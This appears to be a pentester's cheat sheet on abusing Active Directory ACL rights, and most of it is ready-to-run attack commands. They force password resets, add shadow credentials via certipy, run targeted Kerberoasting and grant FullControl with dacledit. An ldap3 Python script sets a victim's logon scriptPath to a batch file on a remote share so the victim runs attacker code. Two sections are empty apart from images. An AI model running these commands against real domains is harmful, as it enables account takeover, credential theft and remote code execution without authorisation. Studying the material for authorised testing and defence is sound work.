# ACL Abuse

![Alt text](/Images/image-12.png)

## ForceChangePassword on User

```bash
net rpc password targetUser -U domain.com/username%password -S dc.domain.com
```

## GenericWrite on User

This could be abuse with 3 different technics:

1. shadowCredentials (windows server 2016 or +)
2. [targetKerberoasting](https://github.com/ShutdownRepo/targetedKerberoast) (password should be weak enough to be cracked)
3. [logonScript](https://github.com/franc-pentest/ldeep) (this need a user connection and to be honest it never worked or unless with a script already inside sysvol)

```bash
# Shadow Credentials
certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername'
# kerberoasting
python3 targetedKerberoast.py -v -d domain.com -u username -p password --request-user targetUsername
ldeep ldap -u username -p 'password' -d domain.com -s ldap://dcIP search '(sAMAccountName=targetUsername)' scriptpath
```

```python
import ldap3
dn = "CN=targetUsername,OU=OUUSER,DC=domain,DC=com"
user = "domain.com\\username"
password = "password"
server = ldap3.Server('dc.domain.com')
ldap_con = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM)
ldap_con.bind()
ldap_con.modify(dn,{'scriptpath' : [(ldap3.MODIFY_REPLACE, '\\\\ip\share\exploit.bat')]})
print(ldap_con.result)
ldap_con.unbind()
```

## WriteDacl on User

```bash
dacledit.py -action 'read' -principal username -target 'targetUsername' 'domain.com'/'username':'password'
dacledit.py -action 'write' -rights 'FullControl' -principal username -target 'targetUsername' 'domain.com'/'username':'password'
## Now you can abuse GenericWrite 
```

## Add self on Group



## Generic All

![Alt text](/Images/image-13.png)



### References

- https://bloodhound.readthedocs.io/_/downloads/en/latest/pdf/
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse